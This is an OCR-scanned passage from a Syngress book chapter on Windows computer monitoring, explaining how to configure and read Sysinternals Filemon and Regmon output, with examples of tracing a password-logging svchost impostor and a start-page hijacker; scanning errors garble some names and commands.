the speed of certain aspects of it. 
Continued 

Computer Monitoring 9 Chapter 4 
185 
Table 4.7 continued Optimal Filemon Configuration Settings 
Configuration Option 
History Depth 
Show Milliseconds 
Setting and Description 
O. Setting the history depth to 0 will allow 
you to see the complete history of all the 
previous packets displayed in the listview. 
Setting this to a number, n, will show only 
n previous entries. 
Enabled. By enabling this option, you have 
a more accurate time-stamp as to when the 
activity occurred. Registry activity can occur 
very rapidly, so adding milliseconds can 
allow you to differentiate times between 
different Registry requests. 
*You should set this option depending upon your particular needs. 
Selecting the Volumes to Monitor 
Filemon monitors not only physical disk activity, but also named pipes, mail slots, 
and network activity, as shown in Figure 4.4. For the most part, you will be moni- 
toring traffic only on the file system or on networks, but it is good to know what 
each category means. 
Figure 4.4 Filemon Volumes 
Named Pipes 
A named pipe is a named means of communication between a server and one or more 
clients. Any process that has the appropriate permissions can communicate with a 
named pipe.You generally can use named pipes between either local processes or 
processes on different computers. 

186 
Chapter 4 9 Computer Monitoring 
Mail Slots 
Mail slots are a way for one application to send a message to another application 
either locally or remotely. 
Network 
Use the network volume setting to monitor traffic over network shares or via 
Windows UNC. 
File System 
Specify the physical storage devices that you want to monitor. Filemon, by default, 
will select all of the fixed disks on your computer. A fixed disk is a storage device that 
you cannot remove, such as a hard drive. 
Understanding Filemon's Output 
Filemon's output is divided into seven columns. The following subsections identify 
each column and describe the type of information they can display. 
# 
Each entry in the listview is numbered sequentially, with the first entry starting at 
one. 
Time 
Filemon displays the Time column in two ways. The default method is the stop- 
watch. In stopwatch mode, the column will display the length of time it took for the 
specific activity to complete. The second method is clock mode, which will show 
the actual time the entry took place.You can change this option in Options [ 
Clock Time. 
Process 
This column shows the actual process name that is accessing the Registry, followed 
by its PID. For example, if the process was excel.exe:3028, the process name would 
be excel.exe and its PID would be 3028. 
Request 
When a process accesses the file system, Filemon will add an entry into the listview 
with a request that designates the type of activity that just occurred. Table 4.8 lists 
the common requests that you will see in Filemon. 

Computer Monitoring ~ Chapter 4 
187 
Table 4.8 Filemon Requests 
Request 
Description of Request 
CLOSE 
The resource listed in the path was closed. 
CREATE 
The resource listed in the path was created. 
DELETE 
The resource listed in the path was deleted. 
DIRECTORY 
Information about the directory was requested. 
LOCK 
Locks a region of the resource listed in the path so 
that only the current process can use it. 
OPEN 
The resource listed in the path was opened. Before 
you can access a file, you must open it. 
QUERY INFORMATION 
The resource listed in the path was queried for 
information that can consist of everything from its 
file attributes to its last modification time. 
READ 
Data was read from the resource listed in the path. 
SET INFORMATION 
Enables you to change certain information about 
the resource listed in the path. This information can 
be everything from attributes such as modifications 
and access times to filenames. 
UNLOCK 
Unlocks a region of the resource listed in the path 
so that other processes can use it. 
WRITE 
Data was written to the resource listed in the path 
column. 
Path 
This column shows the actual resource that the specific activity accessed. 
Result 
For each request, there is a result. Table 4.9 describes some of the more common 
results that you will encounter. 

188 
Chapter 4 9 Computer Monitoring 
Table 4.9 Filemon Activity Results 
Resu It 
Desc ri ption 
END OF FILE 
A read request has reached the end of the file. 
FILE NOT FOUND 
The file could not be found. 
NAME COLLISION 
A CREATE request or rename action failed because 
the file name already exists. 
NO MORE FILES 
The DIRECTORY request has finished enumerating 
the contents of a directory. 
PATH NOT FOUND 
The directory could not be found. 
RANGE NOT LOCKED 
The process attempted to unlock a locked range in a 
file that was not locked. 
SUCCESS 
The activity was successful. 
Other 
The Other column contains result codes or diagnostic data. Table 4.10 describes 
some of the more common entries found in this column. 
Table 4.10 Entries Found in the Other Column 
Entry 
Description 
Attributes 
Excl 
FileBasiclnformation 
The request retrieved the file attributes. 
Specifies whether a lock request was set for 
exclusive access. If it was set for exclusive 
access, Excl will be set to Yes. 
The request retrieves/sets basic information 
about a file, such as creation time, last access 
time, last write time, change time, or its 
attributes. 
FileBothDirectorylnformation Request for detailed information about the files 
in a directory. A DIRECTORY request with this 
entry will continue to occur until no more file 
information is returned. 
FileNameslnformation 
FileRenamelnformation 
This request retrieved/set the filename and the 
length of the filename. 
This request set information about a file 
rename. 
Continued 

Computer Monitoring 9 Chapter 4 
189 
Table 4.10 continued Entries Found in the Other Column 
Entry 
Length 
Offset 
Options 
Description 
Depending on the request, this can be the size 
of the file in bytes or the amount of data being 
read or written to. 
The starting byte of the file that the READ, 
UNLOCK, or WRITE request specified. 
Specifies the options that were used when the 
resource was opened or created. 
Now that you understand what all of this output means, let's look at some 
examples and see how Filemon displays common file activity. The first example, 
shown in Figure 4.5, shows the results of typing the dir c:~indows command from a 
console window. 
Figure 4.5 A Directory Listing of Windows 
It starts with an OPEN request, meaning that the process is opening a stream to 
the directory in order to get information from it. As it is using a DIRECTORY 
request, we know the process is querying the contents of the C:\Windows directory 
for information. As stated in Table 4.10, if we see FileBothDirectoryInformation in 
the Other column, that means the process is querying the directory for information 
about its files and that this request will repeat until there are no files left on which 
to return information. When that occurs, you will see a DIRECTORY request with 
a NO MORE FILES result, as shown in sequence 19 in Figure 4.5. Finally, as the 
directory is finishing the enumeration, the stream to the directory closes. Figure 4.6 
shows an example of a process reading a file. 

190 
Chapter 4 9 Computer Monitoring 
Figure 4.6 A Process Reading a File 
In Figure 4.6, the user is reading the file C:\Filemon.LOG using the cat.exe 
program.The file is opened in entry 120.The cat.exe program proceeds to read the 
file 4 KB at a time. Each successive read from the file increases the Offset by an 
additional 4 KB. So, if you look at entry 121, which is the first READ, you can see 
that the user is reading the file from Offset 0, which is the beginning of the file, and 
will read the bytes specified by the length, which is 4096. This occurs until the end 
of the file is reached, at entry 166. When the read process finishes, the user finishes 
the request by closing the file. 
Setting Up Filters 
Filemon is configured by default to list file activity for every process on the system. 
Unfortunately, on a normal system, listing the file activity for every process can 
quickly overwhelm your display and make it extremely difficult to find the activity 
you need. To overcome this obstacle, Filemon can filter the output based on the pro- 
cess, the path, and a certain type of activity. To access the filter you use the Options 
I Filter/Highlight menu item, which brings up the Filemon Filter screen shown 
in Figure 4.7. 

Computer Monitoring 9 Chapter 4 
191 
Figure 4.7 The Filemon Filter Screen 
You can use three text fields to filter the output.You can add filters or paths, 
separated by semicolons or the asterisk character, which is a wildcard. If you leave 
the wildcard in the Include field, it will list all activity; otherwise, it will list only the 
activity that matches the strings in the Include filter. To exclude an activity, you add 
it to the Exclude field. Therefore, if you have an Include filter that matches c:\win- 
dows and an Exclude filter that matches c:\windows\system32, Filemon will display 
activity for all entries that contain c:\windows, but do not contain 
c:\windows\system32.Table 4.11 provides more detail regarding the text fields. 
Table 4.11 Filemon Filter Text Field Options 
Text Field 
Include 
Exclude 
Highlight 
Description 
Any processes or paths listed in this filter will be the 
only ones displayed in the listview. If you want to 
see all processes and paths you need to place an * 
in this filter. 
Any process or path listed in this filter will be 
excluded from the output. 
Any filter in this field will be highlighted in the 
listview display. You can specify the color that the 
entries should be highlighted in the Options I 
Highlight Colors menu item. 
Filemon also provides five checkboxes that you can use to filter activity in the 
listview (see Table 4.12). It is important that you at least select the Log Successes 
or the Log Errors checkbox (you can select both if you want). This is because suc- 
cesses and errors constitute every type of activity, and if you uncheck both of these 
checkboxes, Filemon will have nothing to display. 

192 
Chapter 4 9 Computer Monitoring 
Table 4.12 Filemon Filter Checkbox Options 
Text Field 
Description 
Log Opens 
Displays activity where a resource is opened. 
Log Reads 
Displays activity from where a resource is read. 
Requests that match this filter include QUERY 
INFORMATION, DIRECTORY, and READ. 
Log Writes 
Displays activity when a resource is written to. 
Requests that match this filter include DELETE, 
WRITE, and SET INFORMATION. 
Log Successes 
Displays activity that successfully completed. 
Log Errors 
Displays activity that resulted in an error. 
, 
You can also add filters directly from the listview screen by right clicking on an 
entry and selecting either Exclude Process or Exclude Path. If you exclude the 
process, it will no longer show any activity for that process and it will filter the pre- 
vious activity for this process out of the display. If you choose to filter the path, it 
will no longer show the activity for that path and will remove any historical entries 
from the current output. 
Real-World Examples 
Filemon is an essential tool for any security professional or network administrator's 
arsenal. This utility, as we show in the real-world examples in this section, allows us 
to quickly spot strange file activity as well as monitor file activity as a user logs on 
and off a computer. 
Determining Which Program Keeps Creating a Specific File 
Filemon is a great tool to use to monitor your computer for strange behavior so that 
you can act on it. For example, malware these days are tricky little critters. They dis- 
guise themselves, constantly write files to your hard drive, and severely decrease the 
performance of your computer. Using Filemon, though, makes these types of pro- 
grams stick out like a sore thumb. For example, look at the output in Figure 4.8. 

computer Monitoring 9 Chapter 4 
193 
Figure 4.8 A Program Continuously Creating Desktop.html 
You can see the svchost.exe process creating an 882-byte file called C:\win- 
dows\desktop.html every five seconds. It is strange that svchost.exe, a legitimate 
Microsoft file, would be creating a file such as this repeatedly, but as svchost.exe is a 
legitimate file, should we be concerned? Absolutely! If something looks strange to 
you, you should always look into it further. With that in mind, we examine the 
desktop.html file and find that it is not actually a .html file, but rather, a text file 
containing passwords of various URLs that you visit. 
What does this mean? Has svchost.exe been replaced by a keylogger? Let's dig 
down further by right-clicking the entry and selecting Process Properties. This 
brings up the box shown in Figure 4.9. 
Figure 4.9 Process Properties 
If something looks fishy to you, you have a sharp eye. Notice the path to the 
process.This program is located in the C:\ folder rather than the %System% folder, 
where the legitimate svchost.exe resides. We now know that this program is a piece 

194 
Chapter 4 9 Computer Monitoring 
of malware and that we can delete it safely. This teaches us not trust a book by its 
cover. 
Using PsExec to Run Filemon during Logon/Logoff 
One of the problems with the Sysinternals monitoring tools, and this goes for 
Tokenmon and Regmon (which we'll discuss in the section titled "Viewing All 
Registry Activity with Regmon") as well, is that they run in the context of the user 
who starts them. That means if the user logs off, the program shuts down as well. 
This makes sense because a process cannot continue to run once a user logs off. 
Unfortunately, this makes it difficult for you to monitor activity during events such 
as logon and logoff. 
Another Sysinternals program, PsExec, enables you to overcome this obstacle by 
running Filemon in the System account. By running Filemon in the System 
account, you can log on and log off the computer as much as you want and the pro- 
gram will continue to run.You also want to use the -i argument, which will make 
Filemon be interactive with the desktop so that any user can see the program. 
Finally, you want to use the -d argument so that the system does not have to wait 
for the program to finish. When you combine all of these arguments, you have the 
command psexec -sid~filemon. exe. 
When running this command, you need to make sure that Filemon.exe is 
located somewhere in the Windows path. Issue that command on the computer you 
want to monitor, and you will see that Filemon starts running. The interesting thing, 
though, is that now if you log offWindows and log on as another user, Filemon will 
still be running and continuing to report the activity that occurred during the logoff 
and logon. 
Continued 

Computer Monitoring 9 Chapter 4 
195 
Continued 
www.syngress.com 

196 
Chapter 4 9 Computer Monitoring 
Viewing All Registry 
Activity with Regmon 
Most administrators and security professionals have had to change or read a setting in 
the Registry in order to accomplish a particular task, whether to change a setting for 
which there is no user interface or to disable/enable features that you cannot manip- 
ulate through a Windows utility. Performing these tasks is generally easy.You fire up 
Regedit, or another Registry-editing program, and make your changes. What do you 
do, though, if a particular setting keeps changing, but you do not know what program 
is making these changes? What about if you need to change a program's configura- 
tion, but there is no documentation showing where these settings are stored? 
This is where being able to monitor real-time Registry activity comes in handy. 
By having this ability, you can see the various programs that are accessing the 
Registry, what they are doing, and where they are doing it. In this section, I will 

Computer Monitoring 9 Chapter 4 
197 
briefly introduce the Registry and discuss how to use the Regmon utility to view 
live activity in the Registry. With this information and some real-world examples, 
you will be on your way to quickly diagnosing similar problems as you encounter 
them. 
A Brief Introduction to the Windows Registry 
The Windows Registry is a key component of Windows. This is the portion of the 
operating system where configuration items such as program settings, device driver 
configurations, memory and process management settings, and entries for programs 
that will load when a computer starts are stored. The Registry's structure is similar to 
a filing cabinet with six draws. In a filing cabinet, each draw contains folders, which 
contain either more folders or files. When referring to the Registry, each draw cor- 
responds to one of the six root keys shown in Table 4.13, with each root key being a 
topmost container. The folders correspond to Registry keys, which are containers 
that can contain either other keys or values. The files would correspond to values, 
which are used to store actual data. When referring to keys, the term subke), simply 
means a key that is stored under another key.You can use the terms keys and subkeys 
interchangeably, as they refer to the same type of object. 
Table 4.1 3 Root Keys of the Windows Registry 
Name 
Abbreviation 
HKEY CLASSES ROOT 
HKCR 
n 
HKEY CURRENT CONFIG 
HKCC 
HKEY CURRENT USER 
HKCU 
HKEY LOCAL MACHINE 
HKLM 
..,= 
B 
HKEY PERFORMANCE DATA 
HKPD 
. . .  
m
.
 
HKEY USERS 
HKU 
m 
Description 
Contains Component Object 
Model (COM) class registra- 
tion information and file asso- 
ciations. 
Contains the configuration 
settings for the current hard- 
ware profile being used. 
Contains the configuration 
settings for the user currently 
logged on. 
Contains systemwide configu- 
ration settings. 
Contains system performance 
data. 
Contains the user configura- 
tion for all user accounts on 
the system. 

198 
Chapter 4 9 Computer Monitoring 
Values are used to store actual data. The data stored in a value depends on the 
type of value it is The most commonly used data types are R~G_DWORD, 
REG_SZ, and REG_BINARY.You use the R_EG_DWORD type to store numbers 
or Booleans such as TRUE/FALSE and ON/OFEYou use the REG_SZ data type 
to store strings, and the Rs 
type to store binary data in any form. The 
more common value types that you will see in the Registry are shown in Table 4.14. 
Table 4.14 Value Types 
Value Type 
REG BINARY 
m 
REG DWORD 
REG DWORD LITTLE ENDIAN 
REG DWORD BIG ENDIAN 
REG EXPAND SZ 
REG LINK 
REG MULTI SZ 
REG NONE 
REG_QWORD 
REG_QWORD_LITTLE_ENDIAN 
REG SZ 
Description 
Raw binary information. 
A 32-bit number. You also can use this to 
store Boolean values such as 0 and 1. 
Same as REG DWORD. A 32-bit number 
where the most significant byte is dis- 
played as the leftmost byte. 
A 32-bit number where the most signifi- 
cant byte is displayed as the rightmost 
byte. Windows 2003 typically uses this type 
to store numbers. 
A variable-length string that can contain 
environment variables that expand when 
they are used. For example, if the string 
contains %WinDir%, when a program 
accesses this string it will expand the 
%WinDir% variable to the actual directory 
under which Windows is installed. 
A symbolic link. 
Contains a series of null (~0) terminated 
strings. Each string is terminated with a 
null character and the last string must be 
empty; for example, 
C : \Windows~System3 2\OC : \Windows\OC : ~Pr 
ograms Files\O\O. 
Does not have a defined value type. 
A 64-bit number. 
A 64-bit number in little-endian format. 
Contains a null terminated string. For 
example: C:\Windows~System32ole32.dlAO. 

Computer Monitoring 9 Chapter 4 
199 
The Registry is not stored in a single file, but rather, in smaller files called hives. 
Each hive is loaded at a particular point in the Registry when the computer starts. 
For example, the data found under the HKCU key is retrieved from the Ntuser.dat 
file found in the users profile directory (\Documents and Settings\<username>\). 
When a user logs on, the data found in that file is retrieved and is stored under the 
HKCU root key. Other keys are similarly filled in when the operating system starts. 
For example, the information found under the HKLM key is stored in four different 
files, as shown in Table 4.15. 
Table 4.15 Locations of Files That Correspond to Registry Locations 
Registry Location 
HKEY LOCAL MACHINE\SYSTEM 
HKEY LOCAL MACHINE\SAM 
HKEY LOCAL MACHINE\SECURITY 
HKEY LOCAL MACHINE\SOFTWARE 
File Location 
\Windows\System3 2\Config\System 
\Windows\System3 2\Config\Sam 
\Windows\System3 2\Config\Security 
\Windows\System3 2\Config\Software 
If you want more information on Registry hives and where they are located visit 
http: / /ms dn. micro so ft. com/library/default.asp ?url =/library/en-us/sysinfo / 
base/about_the_registry.asp. Now that we have covered the Registry and how it is 
structured, let's start using Regmon. 
Using Regmon to Monitor 
Real-Time Activity in the Registry 
You can download Regmon from www.sysinternals.com/Utilities/Regmon.html. 
Once the program is downloaded you just extract it to your hard drive and start 
regmon.exe to launch it. When run, Regmon will automatically begin capturing any 
current activity in the Registry and display it in the listview. Figure 4.10 shows the 
main window of Regmon with all of its major areas labeled. 

200 
Chapter 4 9 Computer Monitoring 
Figure 4.10 The Regmon Interface 
The largest portion of the screen is devoted to the listview. The listview is where 
Regmon will display all the captured activity in the Registry. The other two por- 
tions are the menu bar and the toolbar.The menu bar contains Regmon's main con- 
figuration settings and the toolbar contains buttons that allow you to perform tasks 
quickly, such as saving the activity to a log file, loading previous activity from a log 
file, stopping and starting the capture process, and so on. I will not go into each of 
these options, as for the most part, they are self-explanatory. 
It's very easy to use Regmon. To start or stop capturing activity you simply need 
to click on the magnifying glass button on the toolbar. IfRegmon is in capture 
mode, clicking on the button will put a red slash through it, signifying that it is no 
longer capturing. To begin the capture process again you just need to click on the 
button again. 
If you want to modify a particular Registry entry yourself, you can simply 
double-click on the entry. This will launch regedit.exe and will bring you directly to 
the key that corresponds to the entry in the listview. From there, you can view the 
key and its associated values. 
To copy a specific entry from the listview into your clipboard, simply select the 
entry and use the Ctrl+C keyboard combination to copy the selected lines into 
your clipboard.You can then paste the lines into another application of your choice. 
To delete entries from the listview simply select them and then press the Delete key 
on your keyboard. 

Computer Monitoring 9 Chapter 4 
201 
Configuring Regmon 
As said previously, using Regmon is simple. However, enabling or modifying certain 
settings makes Regmon even easier to use. Table 4.16 shows the configuration 
options, under the Options menu, and what you should set them to in order to 
make the program's output easier to understand and use. 
Table 4.16 Optimal Configuration Settings 
Configuration Option 
Autoscroll 
Clock Time 
History Depth 
Show Milliseconds 
Setting and Description 
Enabled. By enabling this setting, you can 
follow the real-time activity of the Registry with 
the latest activity being shown at the bottom of 
the listview. 
Enabled. When you enable this option, each 
entry will be time-stamped so that you know the 
exact time the Registry activity occurred. 
O. Setting the history depth to 0 will allow you 
to see the complete history of all the previous 
packets displayed in the listview. Setting this to a 
number, n, will show only n previous entries. 
Enabled. By enabling this option, you have a 
more accurate time-stamp as to when the 
activity occurred. Registry activity can be very 
quick, so adding milliseconds can allow you to 
differentiate times between different Registry 
requests. 
Understanding Regmon's Output 
The Regmon output is the meat of the application. From the output, you can see 
what processes are accessing the Registry and what activity they are performing on 
it. The output in the listview is broken up into seven different columns, each 
described in the following subsections. 
# 
Each entry in the listview is numbered sequentially, with the first entry starting at 
one. 

202 
Chapter 4 9 Computer Monitoring 
Time 
Regmon displays the Time column in two ways. The default method is the stop- 
watch. In stopwatch mode, the column will display the number of seconds that have 
elapsed since you started Regmon or cleared the listview when the particular 
activity occurred. The second method, clock mode, will show the actual time that 
the entry took place. I find that clock mode is more useful when trying to diagnose 
problems. 
Process 
This column shows the name of the process that is accessing the Registry, followed 
by its PID. For example, if the process was regedit.exe'1521, the process name would 
be regedit.exe and its PID would be 1521. 
Request 
When a process performs a particular function on the Registry, its requested activity 
appears under the Request column. Here are the most common requests and an 
explanation of what they mean: 
9 
OpenKey A process is opening a key for use. All keys must be open 
before a process can access it. Once the key is open, it can be used for fur- 
ther actions. A CloseKey request against the same Registry key should 
always eventually follow an OpenKey request. 
9 
CloseKey A process is closing the key now that it has finished accessing it. 
An OpenKey request should always precede a CloseKey request. 
9 
CreateKey A new key has been created at the path shown. 
9 
DeleteKey A key designated by the path was deleted. 
9 
DeleteValueKey The value indicated by the path was deleted. 
9 EnumerateKey When a process wants to determine what other subkeys, 
but not values, are under a key, you will see an EnumerateKey request. The 

Computer Monitoring 9 Chapter 4 
203 
program will issue further EnumerateKey requests until no more subkeys 
are available to be read. 
9 EnumerateValue When a process wants to determine what other values, 
but not subkeys, are under a key, you will see an EnumerateValue request. 
The program will issue further EnumerateValue requests until no more 
subkeys are available to be read. 
9 
SetValue A process has created a value or changed the data contained in 
the value designated by the path. 
9 
QueryKey A process is retrieving particular information about the key 
specified by the path. 
9 
QueryValue A process is reading the data contained in the value specified 
by the path. 
9 LoadKey A process is attempting to load a hive into the specified path. 
9 UnloadKey A process is attempting to unload a hive specified by the 
path. 
Path 
The path represents the Registry key or value that is being used for this particular 
entry. 
Result 
Each activity entry in the listview has a corresponding result that tells you the status 
of the particular Registry activity that has occurred. The five most common results 
are defined as follows: 
SUCCESS The specified activity was successful. 
NOTFOUND 
The specified Registry key or value was not found. It is 
very common to see NOTFOUND results while using Regmon. Many 
programs will query the Registry for configuration options when the pro- 
gram starts. If the option is not set, and therefore it is not in the Registry, 
the result will be NOTFOUND. 
BUFOVRFLOW An application is querying the Registry for the buffer 
size needed to hold the value's data. When an application queries the 
Registry for the data contained in a value, it needs to store that data in a 
buffer of the right size. In many cases, though, the program does not know 

204 
Chapter 4 9 Computer Monitoring 
what the proper buffer size should be in order to accommodate the data 
contained in the value. It will therefore query the Registry using a function 
that has one of its values set to NULL, or 0, and if the value exists, the 
function will then return the size of the buffer necessary to hold the data. 
The program will again issue the same query on the value, now with a 
buffer size large enough to hold the data, in order to get the data contained 
in the value. The first time it queries the value and receives the size of the 
buffer necessary is the event that will trigger the BUFOVRFLOW condi- 
tion. Figure 4.11 shows this type of action. 
Figure 4.11 A BUFOVRFLOW Entry 
ACCDENIED 
The action is denied due to lack of permissions. 
NOMORE 
When a program wants to list the values or subkeys listed 
under a key, it enumerates them one at a time. When no more keys or 
values remain to enumerate, it gives a result of NOMOKE, stating that it 
has finished. This is readily apparent when Regmon is running and you use 
Regedit. For example, in Figure 4.12, you can see a key that has been 
expanded using Regedit. First, you see a request for EnumerateKey, fol- 
lowed by a series of QueryKeys. The series finally ends with an 
EnumerateKey with a result of NOMORE, meaning that no more keys 
remain to enumerate. 
Figure 4.12 Enumerating a Key Until There Are No NOMORE 
Other 
For each type of access to the Registry, Regmon will place some information in the 
Other column. This information can be the data found in a value, the access rights 
with which a key was opened, or the subkeys found under a key. Here is some of 
the more common data you will find in this column: 

Computer Monitoring 9 Chapter 4 
205 
9 
Access Certain Registry functions, such as OpenKey and CreateKey, open 
the key or set the key using specific security attributes. The hexadecimal 
number after Access:, such as Access: 0x20019, represents the security mask 
used. 
9 
Subkeys When a process successfully performs a QueryKey, 1Kegmon will 
report the number of subkeys underneath the key specified in the path 
column. 
9 
"text" This means that any text contained in quotes is the data contained 
in a STRING value. 
9 
NxN A hexadecimal number, such as 0x0 or 0xl, is the data contained in 
a DWOtLD value. 
9 
Name The text after Name: is the name of a key or a value. 
9 
Hexadecimal Numbers Hexadecimal numbers, such as 00 00 00 00 5C 
00 5C 00, represent the data contained in a BINARY value. 
Setting Up Filters 
If you have started used 1Kegmon you will quickly realize that the amount of 
Registry activity occurring on your computer can make finding specific entries 
nearly impossible. That is where filters come into play. ILegmon enables you to add 
filters to the current output in the listview, and to future output, so that you can 
quickly find only the information you need. These filters allow you to limit the dis- 
play of activity based on the process, the path name, the type of the activity, and 
whether the activity completed successfully. 
The Options I Filter/Highlight menu item presents the ILegmon Filter user 
interface shown in Figure 4.13. The screen contains a series of text fields and check- 
boxes that allow you to customize how you want the data to be shown. The text fields 
allow you to enter the various processes or Registry paths that you want to include or 
exclude, and the checkboxes determine the type of activity you want to filter. 

206 
Chapter 4 9 Computer Monitoring 
Figure 4.13 The Regmon Filter Interface 
Three text fields control the filter. When creating filters, you can use the asterisk 
(*) as a wildcard character, and you can list multiple filters at the same time as long 
as they are separated by semicolons. In this way, you can set up filters, for example, 
that exclude every process except for the semicolon-separated processes in the 
Include field. Note that more generic filters always override more specific filters. So, 
if you have a filter for HKLM and HKLM\Software\*, the more generic filter~ 
HKLM~will override the more specific filter~HKLM\Software\*.Also remember 
that the most general filter is the * character by itself, so if you add an Include filter 
and then put an * in the Exclude filter, the more general wildcard will exclude 
everything. Table 4.17 explains each text filter field. 
Table 4.17 Regmon Filter Text Field Options 
Text Field 
Include 
Exclude 
Highlight 
Description 
The processes and Registry paths listed in this filter will 
be the only ones displayed in the listview. If you wish to 
see all processes and paths, you need to place an * in 
this filter. 
The processes and Registry paths listed in this filter will 
not be displayed in the listview. 
Any filter in this field will be highlighted in the listview 
display. You can specify the color that the entries 
should be highlighted in the Options I Highlight 
Colors menu item. 
To filter the Registry activity further you can use the checkboxes to filter based 
on the type of activity being performed. Table 4.18 provides an explanation of each 
checkbox. 
www.syngress.com 

Computer Monitoring 9 Chapter 4 
207 
Table 4.18 Regmon Filter Checkbox Options 
Checkbox 
Opens 
Reads 
Writes 
Successes 
Errors 
Description 
Checking this box will display any activity that corre- 
sponds to a key being opened or closed, such as the 
OpenKey and CloseKey requests. 
Checking this box will display any activity that corre- 
sponds to information being retrieved from the Registry, 
such as the QueryKey and QueryValue requests. 
Checking this box will display any activity that corre- 
sponds to information being written to the Registry, 
such as the SetValue request. 
Checking this box will display any activity that corre- 
sponds to successful completion of a request. 
Checking this box will display any activity that corre- 
sponds to errors that may have occurred while accessing 
the Registry. 
It is also possible to have filters added for you directly from the listview screen. If 
you right-click on an entry, you will see a context menu similar to that shown in 
Figure 4.14. This dialog box allows you to add the current process or Registry path 
automatically to the Include or Exclude filter. Once added, the process or Registry 
path will apply the new filters to the current output. 
Figure 4.14 The Listview Filter Context Menu 

208 
Chapter 4 9 Computer Monitoring 
Example Filters 
Table 4.19 lists some examples of Listview filters. 
Table 4.19 Some Listview Filters 
Filter 
Code 
Exclude all paths and processes 
except those used by explorer.exe 
Include: explorer.exe 
Exclude: 
Checkboxes checked: ALL 
Show all processes and their paths 
except those used by explorer.exe 
Include: * 
Exclude: explorer.exe 
Checkboxes checked: ALL 
Only show reads from winword.exe Include: winword.exe 
Exclude: 
Checkboxes checked: Log Reads, Log 
Successes, Log Errors 
Only show Registry activity to 
Include :HKLM\Software\*;HKLM\ 
HKLM\Software and HKLM\SYSTEM\ SYSTEM\CurrentControlSet\* 
CurrentControlSet 
Exclude: 
Checkboxes checked: ALL 
Examining the Registry during the Windows 
Boot Sequence in an NT-Based Operating System 
1Kegmon has a very useful feature for NT-based operating systems that allows you to 
log the Registry activity while the operating system boots. In order for 1Kegmon to 
start in this way, you need to select the Options I Log Boot menu item. Once 
you select this menu item, you will see a notification stating that Regmon will log 
Registry activity the next time the computer restarts and will save the activity in the 
C:\Windows\REGMON.LOG file.The format for this log will be the same as for 
the normal log: a tab-delimited text file. 
Logging the boot process can generate a large log file~it generated a 26MB log 
file on my machine--so make sure you have enough space on your Windows drive 
in order to accommodate the file. If Regmon finds that it is filling up all the hard- 
drive space, it will truncate the log file so that you can properly boot your computer. 
1Kegmon will continue logging to this file until you are at your desktop and you 
start up 1Kegmon or shut down the system. 

Computer Monitoring 9 Chapter 4 
209 
Real-World Examples 
In this section we will go over some examples of how you can use Regmon to solve 
real-world problems. Whether you're learning how malware works or examining 
where a program stores its configuration settings, Regmon allows you to quickly 
find the information you need. 
Determining l ich Program Is 
Changing Your Internet Explorer Start Page 
Regmon is an essential tool for malware removal. I am sure many of you have been 
in situations where a computer you were working on had the Internet Explorer start 
page constantly changed to a search page or porn page by some unknown malware 
that your removal software was unable to detect. 
Regmon allows you to determine which process is the malware that is changing 
Internet Explorer's settings. In this example, you will see how to use Regmon to 
determine what process is actually changing Internet Explorer's startup page. This is 
a real piece of malware and is not something I created for this sample, so what we 
do here truly holds for a real-life situation. 
A user was reporting that when he started Internet Explorer, his browser would 
be redirected to a local page called C'\Secure32.html. After running Regmon, I saw 
repeated entries for a process called PayTime.exe that was doing a SetValue on the 
Registry value HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet 
Explorer\Main\\Start Page, setting it to C:\secure32.html. Now that I knew the 
culprit for my browser hijack, I wanted to know what else this malware did to the 
operating system. Using PsKill.exe, I killed the paytime.exe process and started 
Regmon again.As I was concerned only with what paytime.exe was doing to the 
system, I quickly set up a filter, as shown in Figure 4.15. 
Figure 4.15 The Regmon Filter for paytime.exe 

210 
Chapter 4 9 Computer Monitoring 
After applying the filter, I manually started the paytime.exe executable in order 
to watch what it did to the system, as shown in Figure 4.16. First, it queried 
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution 
Options\paytime.exe, which did not exist.Then, it queried for the value 
HKLM\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\LeakTrack, which also did not exist. Next, it created 
a Run entry called SysTime and pointed it at C:\Windows\System32\PayTime.exe 
in order to start the malware when any user logged on to their account. Then it pro- 
ceeded to set various Internet Explorer values continuously in order make Internet 
Explorer's start page use the file C:\secure32.html page. 
Figure 4.16 Regmon Entries for paytime.exe 
Now that I knew what the malware was doing, it was easy enough to kill the 
entry and remove the Registry entries that it modified. Once I did that, the system 
was cleaned of the malware, and the Internet Explorer settings were set back to their 
defaults. 

Computer Monitoring 9 Chapter 4 
211 
Monitoring Registry Keys Used 
by Programs to Hold Their Program Settings 
I was working with a client who was very particular that the settings for one of their 
applications be the same on every computer on their network. Going to every com- 
puter and manually making all the changes to the program would be inefficient and 
a waste of time. I thought that the best scenario for me would be to find out where 
in the Registry the program's settings were stored, create a Registry file that con- 
tained all of these settings, and then push it onto each computer automatically, 
through a logon script. 
The problem was that I had no idea where the program settings were saved. 
Using Regmon, I was able to create a filter for just that process. Then I started the 
program and changed an option. Once I clicked OK after changing the option, 
Regmon started reporting all the configuration settings being saved to the Registry. 
At this point, I knew from the Regmon log the path to where the settings were 
saved, and it was a simple matter to export the Registry file, modify it as needed, and 
then push the Registry file to be installed on all the other workstations. 

212 
Chapter 4 9 Computer Monitoring 
Summary 
In this chapter, I covered how to use various Sysinternals tools to monitor a com- 
puter or network. These tools enable you to focus on some of the most common 
types of monitoring that a system administrator needs to handle. These include: 
9 
Security 
9 
Processes 
9 
File activity 
9 The Registry 
9 
User activity 
In this chapter, you also learned about logon sessions and security tokens and 
how they interact with the operating system.You learned how to use PsLoggedOn, 
LogonSessions, and Tokenmon to monitor when users are logging on to your com- 
puters and what they are doing.You also now have the ability to examine a process's 
security context and determine if it is impersonating users when it should not be. 
Process and file use is an important aspect for any system administrator. Using 
PsTools and Handles allows you to see what processes and files have been opened 
locally on your computer, or on a remote computer. As these programs are console 
programs, they are also extremely versatile, and you can use them in batch files that 
will allow you to automate various administration tasks. 
Finally, you saw how to use the monitoring programs Filemon and P,.egmon to 
see the real-time activity of programs that are accessing the Windows Registry and 
your file systems. Having this ability, and the knowledge to create filters to ease the 
task of spotting specific activity, you can now troubleshoot problems that are caused 
by spyware or other programs that are using your resources incorrectly. 
Solutions Fast Track 
Viewing Users Who Are 
Logged On and What They're Doing 
Vr 
PsLoggedOn lists information about a user logged on to a local or a remote 
computer. 
Vr 
A logon session is created every time a user logs on to a computer. 

Computer Monitoring 9 Chapter 4 
213 
LogonSessions shows all the logon sessions on a local computer, including 
system accounts. 
A token is an object that contains a user's security context. 
